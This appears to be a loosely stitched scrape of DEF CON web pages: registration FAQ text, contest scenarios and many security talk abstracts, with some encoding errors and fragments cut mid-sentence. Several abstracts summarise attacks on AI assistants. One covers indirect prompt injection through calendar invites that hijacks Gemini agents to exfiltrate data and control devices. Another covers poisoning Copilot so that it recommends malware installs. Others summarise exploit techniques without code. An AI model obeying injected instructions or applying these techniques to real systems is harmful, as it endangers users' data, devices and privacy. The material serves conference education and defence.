<p>There are no refunds given for cash sales. If you have any doubt about your desire to buy a badge, please refrain from doing so.</p>

<p>We are unable to provide printed receipts at the time of the sale. A generic receipt for the cash sale of a badge will be made available on media.defcon.org after the conference. You are welcome to print your own copy of the receipt on plain paper.</p>

<h3 id=""viablackhat"">Via BlackHat</h3>

<p>If you've purchased a DEF CON badge as part of your Black Hat registration, you're in luck - you will be able to pick up your DEF CON badge at Black Hat on Thursday.  Please bring your Black Hat badge and watch for emails from Black Hat about where exactly the badge pickup will be.  There will be DEF CON goons at Mandalay at the pickup desk to help out and answer questions.</p>

<p>Please note that DEF CON is not able to access or verify Black Hat registration or attendee info.  DEF CON's preregistration list is not the same as Black Hat's.  For help, ask at Black Hat registration or the concierge area. </p>

<h1 id=""misc"">Misc</h1>

<p>Want to buy multiple badges? No problem! We're happy to sell you however many badges you want to pay for.</p>

<p>If you lose your badge, there is unfortunately no way for us to replace it. You'll have to buy a replacement at full price. Please don't lose your badge. :( </p>

<p>If you are being accompanied by a full-time caretaker (such as someone who will push your wheelchair, and will accompany you at all times), please ask to speak to a Registration Goon. Your caretaker will receive a paper badge that will permit them to accompany you everywhere you go.</p>

<h1 id=""stillneedhelp"">Still need help?</h1>

<p>If you have questions about anything regarding human registration that are not addressed here, please ask to speak to a Registration Goon.</p>

<p>Choose your side!</p>

<p>Blue Team
You are assigned to the Cybersecurity Team servicing four Regional Airports within the IG Labs Regional Airport System. The shift this evening started with routine checking status boards, reviewing threat alerts, and checking for any newly identified vulnerabilities that may have an impact on the system from both Information Technology (IT) and Operational Technology (OT) vectors.</p>

<p>Around midnight, chaos ensues! Runway lighting is turning off at your airport and others nearby, planes are circling waiting to land or diverting to other locations. You must regain access to your systems, find the problem, and restore operation to the Runway Lighting Control System quickly and ensure that the other regional airports your team is responsible for do not lose control of their systems and operations are able to continue without interruption.</p>

<p>Red Team(s)
Cybersecurity Teams are often heavily focused on securing Information Technology (IT) systems and devices but may not consider securing Operational Technology (OT) systems and devices. While OT systems and devices may be connected to IT systems, the type of data and protocols are different.</p>

<p>You start your day exploring OT system vulnerabilities and consider what chaos you could create. You see a report that the runway lighting system at one of the IG Labs Regional Airports has been compromised. You start researching to learn more about the attack and the IG Labs Regional Airport System. Satisfied that you have learned enough to add to the madness that has been created at La Valoria, you decide to launch an attack of your own.</p>

<p>Success will be determined by the ability to disrupt the control and operations of the Runway Lighting Systems for the IG Labs Regional Airports at the OT level. DoS and DDoS attacks are not permitted as the intent is to demonstrate an understanding of OT systems, their functionality, and protocols.</p>

<p>Modern attackers arenât waiting for CVEs.
Theyâre quietly mapping your apps and APIs, uncovering unintended exposures, and slipping past defenses.</p>

<p>Donât just react, anticipate.
This workshop pulls back the curtain on the modern attackerâs playbook. Youâll learn how adversaries extract intelligence from exposed metadata clues hiding in plain sight. Then, weâll dive into crafting stealthy, context-aware payloads designed to bypass detection and exploit subtle implementation flaws.
Through real-world examples and guided exercises, youâll learn to identify these patterns, recognize evasions, and build resilient detection and prevention strategies.</p>

<p>Takeaways:
Early-stage recon via api access, information disclosure through common hardening

<p>AppSec Village is proud to present our DEF CON Contest in partnership with SecDim.
Unlike a typical CTF, this contest rewards the players who fix security vulnerabilities. You can choose between secure coding challenges or competing against other players in an Attack &amp; Defence AppSec challenge, where you need to secure your app before being given a chance to hack other playersâ appsð.
You can also develop your own AppSec challenge by following the challenge contribution guidelines. All approved challenges will be hosted during AppSec Village @ DEF CON.</p>

<p>There are two categories of winners:
- The player with the highest total points by the end of the event (August 10 at noon PDT)
- The best-contributed challenge submission</p>

<p>The Award Ceremony will be held at 12:45 PM PDT in the AppSec Village on August 10.</p>

<p>A deep dive into real-world, high-profile CVEs exposes a critical pitfall in AppSec: treating every high-severity vulnerability urgently without understanding its exploitability and business impact. Weâll analyze cases where CVEs are labeled as critical but were originally exploited in different environments, and often found in widely shared kernel code that turned out to be nearly impossible to exploit on cloud containers. By dissecting CVE patches, tracing fix propagation, and attack vectors across platforms like Android, Chrome, and cloud containers, weâll reveal how misinterpreting CVE context leads to wasted triage cycles, unnecessary fixes, and security teams chasing irrelevant threats.</p>

<p>You all know that PLC4TRUCKS is unintentionally accessible wirelessly (CVEs 2020-14514 and 2022-26131). In this talk we will dig into the details of the new CVE-2024-12054 and some other results on the ECU investigated. This talk is tailored to those with an automotive cybersecurity background.
We found ECUs running the KWP2000 diagnostic protocol on PLC4TRUCKS, supposedly secured with their fancy seed-key exchange. But guess what? Those seeds are way more predictable than they should be. A bit of timing trickery, a classic reset attack, and boom â we're in, no peeking at the ECU's responses needed. Blind, non-contact attacks on PLC4TRUCKS? Yep, we found a way. Turns out wireless unauthorized diagnostics access isn't just limited to older equipment. These newer trailer brake controllers' diagnostic functions can be abused too. This situation highlights the need for future tractors to deploy mitigations that protect the trailer from wireless attacks because they are all reachable and even the new ones are vulnerable.</p>

<p>Storm-2372 (Febâ25) has been virtually ignored, even though Russian threat actors demonstrated in-the-wild exploits using OAuth Device Code Phishing (Syynimaa, Octâ20) and PRT/device registration abuse (Moller, Octâ23) that fundamentally puts all Entra customers at risk via its abuse of OAuth, the device registration service, SSO and compromise of the Primary Refresh Token.</p>

<p>This talk starts with Mollerâs original research and compares the API calls and logging for valid device registration flows against the original and other expected attack variants including non-device code OAuth, non-phishing attacks, and endpoint compromise.</p>

<p>Weâll then look at additional implications of the attack, look at on-the-wire payloads, then focus on the challenge of effective detection by going through published best practices with detecting off of Entra sign-in logs, what may or may not be blocked by conditional access policies, where continuous access evaluation helps or not, and what is detected by Sentinel and Cloud Defender.</p>

<p>We will demo the attack, show API payloads, confuse ourselves with logs, using native Microsoft functionality and try to answer what can and canât be done effectively against this attack. Along the way weâll rant about what makes detection (and prevention) so difficult based on the design of Entra, its logs, and native tooling.</p>

<p>AND!XOR creates electronic badges filled with hacker challenges. We love doing this, especially coming up with unique ways for hackers to earn them. 5N4CK3Y is a vending machine hardware hacking project from AND!XOR. We retrofitted it into an IoT CTF based badge dispensing machine, bling and all. Find enough flags on our web hosted CTF platform, you get a 5N4CK3Y dispense code, punch it in, and a badge is vended to you! There are a variety of challenges to earn a badge as well others to continue working on the badge itself once obtained. These span from hardware hacking, reverse engineering, OSINT, network security, phreaking, wireless, and cryptography to name a few. There's a little bit of everything, so it's a perfect way to learn something at one of the many DEF CON villages and talking with people you meet, then attempt the CTF challenges to dispense a badge. Hardware hacking is our passion and we want people to learn on badges once they get them.</p>

<h1 id=""projectaccess:afoxhuntintheshadows"">PROJECT ACCESS: A Fox Hunt in the Shadows</h1>

<p>The last surviving fragments of Project ACCESS, a defunct open comms initiative, have resurfaced. The faceless OmniCorp thought they had erased it from the spectrum, but rogue operatives are pushing back. Disguised among the DEF CON crowd, Foxes are carrying the pieces needed to reboot the system.</p>

<p>Theyâre broadcasting open signals across the con space. Your job? Track them down, follow the trail, and recover the payloads. Some Foxes are stationary. Others are on the move. All of them have something you needâbut they wonât just hand it over. Youâll have to answer DEF CON trivia, solve puzzles, or earn their trust in creative ways.</p>

<p>This isnât a gear-only hunt. Whether youâre rocking SDRs, handheld radios, or just tuned into the right frequency, youâve got a shot. Itâs part signal chase, part real-world goose chase, and 100% hacker weirdness.</p>

<p>Expect:
- Live human Foxes broadcasting short-range signals
- Some Foxes roaming the con floor hunt them down, respectfully
- DEF CON history questions, crypto puzzles, and maybe a social engineering twist or two
- Physical items or clues exchanged when you succeed
- No encryption. No gatekeeping. Just old school radio and clever chaos.</p>

<p>Think you can track the signal, crack the code, and restore the last breath of open access?</p>

<p>Then grab your gear, tune in, and start hunting.</p>

<p>In this game capture the flag you will be presented with real configurations of real wireless and radio technologies to attack. Practice your skill and learn new ones from Radio Frequency IDentification (RFID) through Software Defined Radio (SDR) and up to Bluetooth and WiFi. There may even be Infrared, if you have the eye for it.</p>

<p>RF Hackers Sanctuary is once again holding the Radio Frequency Capture the Flag (RFCTF) at DEF CON 32. RFHS runs this game to teach security concepts and to give people a safe and legal way to practice attacks against new and old wireless technologies.</p>

<p>We cater to both those who are new to radio communications as well as to those who have been playing for a long time. We are looking for inexperienced players on up to the SIGINT secret squirrels to play our games. The RFCTF can be played with a little knowledge, a pen tester's determination, and $0 to $$$$$ worth of special equipment. Our virtual RFCTF can be played completely remotely without needing any specialized equipment at all, just using your web browser! The key is to read the clues, determine the goal of each challenge, and have fun learning.</p>

<p>This game doesn't let you sit still either, as there are numerous fox hunts, testing your skill in tracking various signals. If running around the conference looking for WiFi, Bluetooth, or even a Tire Pressure Monitoring System (TPMS) device sounds like fun, we are your source of a higher step count.</p>

<p>There will be clues everywhere, and we will provide periodic updates via discord and twitter. Make sure you pay attention to what's happening at the RFCTF desk, #rfctf on our discord, on Twitter @rf_ctf, @rfhackers, and the interwebz, etc. If you have a question - ASK! We may or may not answer, at our discretion.</p>

This talk will examine potential client-side deanonymization attacks that can compromise user privacy by exploiting vulnerabilities and misconfigurations within these APIs. </p>

<p>I will explore the Attribution Reporting API, detailing how debugging reports can bypass privacy mechanisms like Referrer-Policy, potentially exposing sensitive user information. I will also explain how destination hijacking, in conjunction with a side-channel attack using storage limit oracles, can be used to reconstruct browsing history, demonstrating a more complex deanonymization technique. </p>

<p>Additionally, I will cover vulnerabilities in the Shared Storage API, illustrating how insecure cross-site worklet code can leak data stored within Shared Storage, despite the API being deliberately designed to prevent direct data access. Real-world examples and potential attack scenarios will be discussed to highlight the practical implications of these vulnerabilities.</p>

<p>The presentation will conclude by emphasizing the critical need for rigorous security and privacy research to ensure that Privacy Sandbox APIs effectively protect user data and achieve their intended privacy goals, given the complexity and potential for unintended consequences in their design and implementation.</p>

<p>Enigma was the infamous German encryption machines that was used in World War 2. A group of British cryptographers successfully broke the sophisticated machine, and in doing so, gave rise to modern adversarial cryptography and the Turing Machine, which would later evolve into the computer. In this workshop, we will look at how adversarial cryptography initially formed and how many of the techniques used still apply today. Additionally, many of the mathematical principles used in both the construction of the Enigma machine and its subsequent breaking are used heavily in modern encryption, which directly relate to the technology used in cryptocurrency.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Over the past two years, we have witnessed the emergence of a new class of attacks against LLM-powered systems known as Promptware.</p>

<p>Promptware refers to prompts (in the form of text, images, or audio samples) engineered to exploit LLMs at inference time to perform malicious activities within the application context.</p>

<p>While a growing body of research has already warned about a potential shift in the threat landscape posed to applications, Promptware has often been perceived as impractical and exotic due to the presumption that crafting such prompts requires specialized expertise in adversarial machine learning, a cluster of GPUs, and white-box access.</p>

<p>This talk will shatter this misconception forever.</p>

<p>In this talk, we introduce a new variant of Promptware called Targeted Promptware Attacks.</p>

<p>In these attacks, an attacker invites a victim to a Google Calendar meeting whose subject contains an indirect prompt injection.</p>

<p>By doing so, the attacker hijacks the application context, invokes its integrated agents, and exploits their permission to perform malicious activities.</p>

<p>We demonstrate 15 different exploitations of agent hijacking targeting the three most widely used Gemini for Workspace assistants: the web interface (www.gemini.google.com), the mobile application (Gemini for Mobile), and Google Assistant (which is powered by Gemini), which runs with OS permissions on Android devices.</p>

<p>We show that by sending a user an invitation for a meeting (or an email or sharing a Google Doc), attackers could hijack Geminiâs agents and exploit their tools to: Generate toxic content, perform spamming and phishing, delete a victim's calendar events, remotely control a victim's home appliances (connected windows, boiler, and lights), video stream a victim via Zoom, exfiltrate emails and calendar events, geolocate a victim, and launch a worm that tarets Gemini for Workspace clients.</p>

<p>Our demonstrations show that Promptware is capable to perform (1) inter-agent lateral movement (triggering malicious activity between different Gemini agents), and (2) inter-device lateral movement, escaping the boundaries of Gemini and leveraging applications installed on a victim's smartphone to perform malicious activities with physical outcomes (e.g., activating the boiler and lights or opening a window in a victim's apartment).</p>

<p>Finally, we assess the risk posed to end users using a dedicated threat analysis and risk assessment framework we developed.</p>

<p>Our findings indicate that 73% of the identified risks are classified as high-critical, requiring the deployment of immediate mitigations.</p>

<p>You may have heard tales of mainframe pentesting and exploitation before - mostly from us! Those stories often focused on the MVS/ISPF side of the IBM z/OS. But did you know that all those same tricks (and more!) can be pulled off in z/OS Unix System Services (OMVS) as well? I bet you didn't even know z/OS had a UNIX side!</p>

<p>Over the years we've discovered multiple unique attack paths when it comes to Unix on the mainframe. In this talk, we'll present live demos of real-world scenarios we've encountered during mainframe penetration tests. These examples will showcase what can happen with poor file hygiene leading to database compromises, inadequate file permissions enabling privilege escalation, lack of ESM resource understanding allowing for privileged command execution, and how dataset protection won't save you from these attacks. We'll also be demonstrating what can happen when we overflow the buffer in an APF authorized dataset.</p>

<p>Attendees will learn how to test these controls themselves using freely available open-source tools and how to (partially) detect these attacks. While privesc in UNIX isn't game over for your mainframe, it's pretty close. By the end, it will be clear that simply granting superuser access to Unix can be just as dangerous, if not more so, than giving access to TSO on the mainframe.</p>

Later in his career he started taking a serious look at mainframe cybersecurity and realized how far behind mainframes had fallen when compared to their more open system (Windows/Linux). At that point he made it his lifes mission to raise awareness and produce tooling to aid in the testing of these critical resources to help keep them safe. Since then he has given talks around the world at places like BlackHat, DEFCON, RSA, has taught multiple workshops and was even under investigation by the Swedish secret police.

<p>High-entropy ASLR was supposed to make bypasses of ASLR on Windows virtually impossible - until now! This talk will debut nine novel bypasses of the strongest form of ASLR on Windows, which makes attacks such as brute-forcing totally infeasible. This talk showcases how mostly simple, easy-to-find ROP gadgets can be used to construct highly reliable, universal ASLR bypasses to key Windows system DLLs, allowing ROP gadgets from those DLLs to be used freely in exploits! The end result? The attack surface is greatly expanded, making it possible to do more attacks on binaries previously constrained by limited gadgets. What may have been impossible before due to insufficient ROP gadgets, now is quite possible! While this talk focuses primarily on ASLR bypass for x64, we will also briefly touch upon similar attacks for x86. As part of this talk, for the first time ever, I am also releasing and open-sourcing a new mini-tool that will generate complete, x64 ROP chains for each of these bypasses! We will see this ASLR bypass attack in action with demo. We conclude with recommendations to help remediate the problem. This talk is an in-depth technical deep dive into Windows internals and the design of this technique, but it will also be presented in an accessible way to beginners.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>In this session, Tobias Diehl will demonstrate a critical vulnerability in Microsoftâs CoPilot AI, exposing how data voids can be hijacked to manipulate AI-generated responses. By exploiting CoPilotâs reliance on limited data sources, Tobias will show how attackers can inject persistent malicious content, associating it with legitimate Microsoft topics, and how AI fails to validate key terms. The presentation will cover the mechanics of key term association attacks, data void exploitation, and their real-world implications, including the risk of CoPilot delivering dangerous installation instructions for command-and-control (C2) beacons for initial access. Using a proof-of-concept from Microsoftâs Zero Day Quest event, attendees will see how the hijacking process works in practice, how threat actors can target enterprise users, and how AI systems can be tricked into guiding users toward compromised actions.</p>

<p>Extended Berkeley Packet Filter (eBPF) has revolutionized Linux kernel programmability, but its complex verification and JIT compilation mechanisms present a significant attack surface. This talk provides a technical deep-dive into discovering and exploiting vulnerabilities in the eBPF subsystem, with three key contributions: state-aware fuzzing methodologies specifically designed for eBPF, focusing on verifier state tracking bugs, JIT compiler flaws, and helper function validation bypasses. These techniques go beyond traditional fuzzing by incorporating knowledge of the verifier's internal state machine.</p>

<p>Systematic approach to weaponizing verifier bypasses into practical kernel exploits, including converting bounds calculation errors into arbitrary read/write primitives, bypassing KASLR via targeted information leaks, and achieving privilege escalation through carefully constructed memory corruption.</p>

<p>Security architecture of eBPF and provide concrete recommendations for hardening the subsystem against these attacks, including improvements to the verifier's state tracking, JIT compiler security, and runtime validation.</p>

<p>ICS Malware is rare. Yet, ICS Malware like FrostyGoop and TRISIS, and related discoveries like COSMICENERGY, were all found on VirusTotal, so analysts still hunt for novel ICS Malware in public malware repositories. In the process, they discover all kinds of tools: research, CTFs, obfuscated nonsense code with no effects, and sometimes, malware targeting ICS/OT sites.  But how do they find and filter out the benign from malicious? Or the ICS and ICS-related malware from regular IT malware? </p>

<p>In this talk, we will use recently discovered samples to walk through the process of hunting and analyzing potential ICS threats. Weâll show the simple queries we use to cast a net, our typical analysis process, and relevant follow-on actions like victim notification. Lastly, weâll discuss how we decide whether a sample is ICS malware using Dragosâs ICS malware definition.</p>

<p>Con la creciente adopciÃ³n de modelos de lenguaje como GPT-4 en sectores crÃ­ticos, los sistemas de inteligencia artificial se han convertido en una nueva superficie de ataque. Esta charla, titulada ""Pentesting AI â Hacking the GPTs"", explora cÃ³mo adaptar metodologÃ­as ofensivas clÃ¡sicas al contexto moderno de IA generativa, revelando vulnerabilidades que pueden comprometer tanto la lÃ³gica de negocio como la integridad del modelo.<em>x000D</em>
<em>x000D</em>
Se iniciarÃ¡ con un repaso a los fundamentos de IA, incluyendo machine learning, deep learning y procesamiento de lenguaje natural (NLP), seguido por una explicaciÃ³n del funcionamiento interno de los LLMs (Large Language Models), sus aplicaciones industriales y sus principales limitaciones: bias, alucinaciones, y falta de interpretabilidad.<em>x000D</em>
<em>x000D</em>
A partir de esto, se abordarÃ¡ el OWASP Top 10 para LLMs, introduciendo tÃ©cnicas ofensivas como prompt injection (directo e indirecto), AI jailbreaks, evasiÃ³n de filtros y manipulaciÃ³n creativa de entradas. Se mostrarÃ¡n ejemplos de explotaciÃ³n y cÃ³mo estas tÃ©cnicas pueden utilizarse para alterar la salida del modelo, extraer informaciÃ³n sensible o evadir mecanismos de seguridad.<em>x000D</em>
<em>x000D</em>
La charla incluirÃ¡ una breve demostraciÃ³n pregrabada utilizando herramientas como Garak (framework ofensivo de red teaming para LLMs) y LLMFuzzer (fuzzer para APIs que integran modelos generativos).<em>x000D</em>
<em>x000D</em>
Se concluirÃ¡ con recomendaciones para mitigar riesgos,, y reforzar los controles aplicados sobre modelos integrados en aplicaciones. Adicionalmente se compartirÃ¡ una serie de recursos que han sido publicados durante el ultimo aÃ±o para poder familiarizarse con este tipo de vulnerabilidades y como explotarlas. <em>x000D</em>

Here we remember figures whose generous spirit and willingness to coordinate security fixes demonstrated that true hacking greatness lies in collaboration.  We are here because DEF CON has been the beating heart of the hacker community for over three decades, growing from 100 people in 1993 to the world's largest hacker conference. As Jeff Moss envisioned, DEF CON is what we make of it, this memorial space represents our commitment to ensuring that the legacy of those we've lost continues to inspire future generations of hackers to pursue knowledge, build community, and use their gifts to make the world better.</p>

<p>Nation-state hackers pose a formidable threat to critical infrastructure, compromising national security, intellectual property, and public safety. This presentation will delve into the tactics, techniques, and procedures (TTPs) employed by nation-state actors, providing a core understanding essential for developing effective defense strategies.
Through an in-depth analysis of three real-world case studies, we will expose the implications of nation-state attacks on laboratory, critical infrastructure, and industrial systems. We will examine how these attacks exploit human vulnerabilities, such as social engineering and insider threats, as well as system weaknesses, including misconfiguration and software vulnerabilities.
Drawing from recent breaches in research laboratories and industrial manufacturing facilities, we will identify the root causes of these incidents, including human error, malicious insider actions, and inadequate security controls. This presentation aims to provide attendees with a comprehensive understanding of nation-state attack patterns, enabling them to strengthen their organizationâs defenses against these sophisticated threats.</p>

<p>Physical security is an important consideration when designing a comprehensive security solution. There are loads of ways to get through a door without actually attacking the lock itself, including using the egress hardware, access control hardware, and countless other techniques to gain entry. Learn how these attacks work as well as how to defend against these attacks in this talk!</p>

<p>Elevator floor lockouts are often used as an additional, or the only, layer of security. This talk will focus on how to correctly incorporate elevators into your security design, and how badly set up elevators could be used to access restricted areasâ including using special operating modes, tricking the controller into taking you there, and hoistway entry.</p>

<p>Kubernetes is the de facto operating system of the cloud, and more and more organizations are running their workloads on Kubernetes. While Kubernetes offers many benefits, it also introduces new security risks, such as cluster misconfiguration, leaked credentials, cryptojacking, container escapes, and vulnerable clusters.</p>

<p>In this hands-on session, attendees will dive into the world of Kubernetes security by exploring powerful open source tools and practical techniques used to audit and exploit K8S clusters. You'll learn how to quickly identify misconfigurations and vulnerabilities in containerized applications running on Kubernetes, leverage those weaknesses to steal service account tokens, move laterally across the environment, and potentially take full control of the cluster. Whether you're a red teamer, bug bounty hunter, or just getting started in cloud security, this session will equip you with the skills to pwn your first Kubernetes cluster.</p>

We are NOT members of where we are going to tour, we are all finding out about the cool things at DEF CON together.</p>

<p>Hi, Iâm Megan Allen.</p>

<p>My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.</p>

<p>I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.</p>

<p>I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.</p>

<p>Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.</p>

<p>Offensive security is meant to improve defenses, but what happens when hostile nation-states start learning from us too? This talk explores how Russian intelligence services and advanced persistent threat (APT) groups have adopted and adapted techniques developed by Red Teamers, sometimes within weeks of public disclosure. These campaigns involve taking newly disclosed exploits, tools, and tricks to exploit modern enterprise systems, such as Microsoft 365 services, Windows features, software development systems, authentication systems, and cloud infrastructure.
Throughout the talk, detection engineering and threat hunting tips shall be provided to offer attendees a technique for detecting and preventing these types of attacks.</p>

<p>For Red Teamers, this talks is a wake-up call: the same tools and tradecraft used to test enterprise security are increasingly turning up in real-world espionage campaigns, sometimes targeting the very governments and public services we rely on. For Blue Teamers, this talk is a reminder to pay close attention to the cutting edge of offensive tooling.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>As we know, spacecraft will become prime targets in the modern cyber threat landscape, as they perform critical functions like communication, navigation, and Earth observation. While the launch of the SPARTA framework in October 2022 gave the community insight into potential threats, it didnât address how to detect them in practical scenarios. In 2025, our research took a different approach as we didnât just theorize about threats, we actively exploited space systems using SPARTA techniques to figure out what Indicators of Behavior (IoBs) would look like in a real-world attack scenario.</p>

<p>By leveraging offensive cyber techniques from SPARTA, we identified the specific patterns and behaviors that adversaries might exhibit when targeting spacecraft. These insights allowed us to systematically develop IoBs tailored to the operational constraints and unique environments of space systems. As a result, we demonstrated how Intrusion Detection Systems (IDS) for spacecraft can be designed with realistic, data-driven threat profiles.</p>

<p>This presentation will walk through our methodology, from exploiting space systems to crafting practical IoBs, and how these insights can directly translate to building robust IDS solutions. Weâll show how a threat-informed, hands-on approach to cybersecurity can transform theoretical knowledge into practical defenses for space infrastructure.</p>

<p>The Chaining of Vulnerabilities session is essential for anyone serious about understanding real-world security threats. Attackers rarely rely on a single flaw - instead, attackers combine multiple low or medium-risk issues to breach systems and exfiltrate data. This session will reveal how these chains are built, and how overlooked weaknesses can lead to full system compromise. With practical case studies, attack flow breakdowns, and defense strategies, youâll gain critical insight into offensive thinking and how to build more resilient systems. Whether you're a developer, security engineer, or red teamer, this session will sharpen your knowledge about how subtle flaws can be linked into powerful exploit chains.</p>

<p>Bloatware. We all hate it, and most of us are good at avoiding it. But some vendor tools â especially those managing critical drivers âÂ are still necessary, often because the drivers available through Windows Update just arenât good enough for performance-critical computing.</p>

<p>What started as a routine driver update took a sharp turn when I confirmed a reboot modalâ¦ from my browser. Wait, my browser shouldnât be able to do that!? To my disappointment (and maybe some surprise), it turned out to be arbitrary code execution â right from the browser. This kicked off a week-long deep dive, uncovering seven trivial CVEs in seven days across several vendors, all exploiting a common pattern: privileged services managing software on Windows with little regard for security.</p>

<p>In this talk, Iâll walk through the journey of discovery and exploitation of several vulnerabilities that lead to LPE/RCE.</p>

<p>NPM Imposters is a fast, team-based game where players must spot malicious NPM packages hiding in plain sight.
Each team gets a deck of cards mimicking real npmjs.com pages â some show metadata like stars, downloads, and maintainers; others reveal parts of the package code, like index.js or package.json.
The challenge? Identify which packages are safe, suspicious, or outright malicious.
Once teams decide, they flip each card to reveal the truth, with a quick explanation based on real-world attacks like event-stream and ua-parser-js.
Itâs a fun, hands-on way to learn how supply chain attacks happen, and how easily trust can be exploited</p>

We can. Using only OSINT, we can enable our very own mobile counter-surveillance  system that will move as we move locally and globally. We can track the trackers, not for  malice, but to answer the deep-rooted question: âWhoâs watching me?â 
Your personal surveillance detection resource will alert you instantly when your data,  email, IP, name, alias, etc, appears in a threat actor forum or social media platform. <br />
In a world of ""Access Everywhere,"" this flips the script, giving you visibility into your  exposure. Youâll learn how to automate monitoring across the open internet, dark web, and  device search engines using the very tools used by those who surveil us.

<p>This talk presents a practical methodology for reverse engineering real-time embedded firmware built on ARM Cortex platforms. Using Ghidra as the primary analysis environment to facilitate collaboration. We will demonstrate how to reconstruct the core layers of an embedded system to gain deep insight into its operation. The Board Support Package (BSP) is mapped using the SVD loader plugin to associate memory-mapped registers with hardware peripherals. The Hardware Abstraction Layer (HAL) is analyzed through custom type recovery and function pattern matching to identify initialization routines and peripheral control logic. At the RTOS level, we apply Ghidraâs BSim plugin to detect task creation, scheduler logic, and inter-process communication constructs used in FreeRTOS and similar kernels. The session equips attendees with a structured approach to reversing embedded C/C++ applications, even when symbols are stripped and source code is unavailable. The goal is to enable firmware analysts, security researchers, and engineers to confidently dissect the layered architecture of constrained, real-time embedded systems.</p>

<p>Bug bounty programs often resemble battlegrounds, where security researchers (""""hackers"""") and vulnerability triagers collide over validity, severity, and bounty rewards. Although this friction can strain relationships, it also represents a powerful opportunity for collaboration and community-building. In this session, experienced bug bounty hacker Richard Hyunho Im (@richeeta) and seasoned triage expert Denis SmajloviÄ (@deni) team up to dissect these challenging interactions, share real-world stories from high-stakes bounty scenarios, and propose practical solutions for improved hacker-triager relationships.</p>

<p>Drawing directly from their experiences on both the researcher and company sides, Richard and Denis cover common scenarios including severity debates (e.g., Gmail aliasing vulnerabilities), unclear bug submissions, controversial gray-area issues (such as Apple's BAC vulnerability rejection), and respectful escalation of bounty disputes (e.g., CVE-2025-24198). Attendees will gain insights into how effective communication, clear business impact framing, and mutual respect can bridge the divide between researchers and triagers.</p>

<p>Beyond monetary rewards, this presentation emphasizes how researchers can strategically leverage bug bounty work to enhance personal branding, build professional networks, and advance career opportunities. With empathy, humor, and candor, Richard and Denis demonstrate that the """"bounty battleground"""" doesn't need to be hostile; it can instead become a place for growth, trust, and professional success.</p>

<p>Key takeaways include actionable strategies for clearer reporting, effectively communicating severity, navigating gray-area cases, and respectfully challenging triage decisions. Ultimately, this talk equips attendees with tools and mindsets to positively shape the bug bounty ecosystem and foster genuine collaboration within the community.</p>

Abstract:<br />

<p>This hands-on workshop dives into real-world AWS misconfigurations that attackers actively exploit to gain privilege escalation and access sensitive data. Youâll step into the shoes of an adversary and learn how common oversights like loose IAM roles, misconfigured Cognito identity pools, or exposed metadata endpoints can be chained into full-blown breaches.</p>

<p>Key Takeaways:</p>

<ul>
<li>Escalate IAM permissions to gain admin-level access</li>
<li>Exploit SSRF in EC2 to steal credentials</li>
<li>Abuse misconfigured Cognito identity pools for unauthorized access</li>
<li>Understand how small missteps can trigger large-scale compromise</li>
<li>Use tools like Cloud Nuke to safely clean and reset your infrastructure</li>
</ul>

<p>Built for all skill levels, this lab gives security engineers, DevOps teams, and developers a safe space to break things, fix them, and come out with a sharper eye for spotting these risks before attackers do.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Whether you access the phone network over your cell phone, an SIP trunk, or via an old-school POTS line, the PSTN is an essential part of your day-to-day life and is a longstanding interest of the hacker community. Despite this interest, the regulatory and technical structures underlying this network are poorly understood, deliberately opaque, and dominated by large corporations. </p>

<p>This talk will demystify the network, starting with a brief overview of the history of the PSTN, followed by a deep dive into the inner functioning of the network. After this, the session will detail the regulatory structures that govern the network, and the technologies it employs. Next, the talk will continue with a practical guide detailing how anyone can form a full local exchange carrier to provide service to their community, covering the entire formation process through first-hand experience: regulatory approval, building interconnect with the PSTN, voice network design, and most importantly, user security and privacy. </p>

<p>With this knowledge in hand, the talk will briefly cover a range of exploits in the network, detailing how STIR/SHAKEN can be trivially bypassed, numbers can be hijacked, and how telecom fraud is monetized. The talk will conclude with a discussion of the future of the PSTN, and potential future issues.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Over the past three years, passkeys have gained widespread adoption among major vendors like Apple, Google, and Microsoft, aiming to replace passwords with a more secure authentication method. However, passkeys haven't yet faced the extensive scrutiny that passwords have endured over decades. As they become central to enterprise identity, it's crucial to examine their resilience.</p>

<p>This presentation demonstrates how attackers can proxy WebAuthn API calls to forge passkey registration and authentication responses. We'll showcase this using a browser extension as an example, but the same technique applies to any website vulnerable to client-side script injection, such as XSS or misconfigured widgets. The extension serves merely as a controlled means to proxy credential flows and manipulate the WebAuthn process.</p>

<p>We'll delve into the underlying theory, present the exploit code, and provide a live demonstration of an attack that succeeds on sites relying on passkeys without enforcing attestation or metadata checksâa common scenario among vendors. If youâre relying on passkeys, this is the side of the flow you donât usually get to see.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Wi-Fi Easy Connect is a protocol introduced by the Wi-Fi Alliance as the core replacement for Wi-Fi Protected Setup (WPS). It is designed to simplify device provisioning using user-friendly methods such as QR code scanning or short-range wireless technologies like NFC and Bluetooth. In this paper, we present a comprehensive security and privacy assessment of Wi-Fi Easy Connect (version 3.0).</p>

<p>Our analysis uncovered several security issues, including aspects of the protocolâs design that may unintentionally expand the attack surface compared to WPS. Notably, we found that design choices intended to enhance usability can compromise security. All identified issues were disclosed to the Wi-Fi Alliance, and we incorporated their feedback regarding mitigations and risk acceptance into our evaluation.</p>

<p>This work underscores the critical balance between usability and security in protocol design and the dangers of prioritizing ease-of-use at the expense of robust security guarantees.</p>

<font size=""+1""><strong>Description:</strong></font><br>
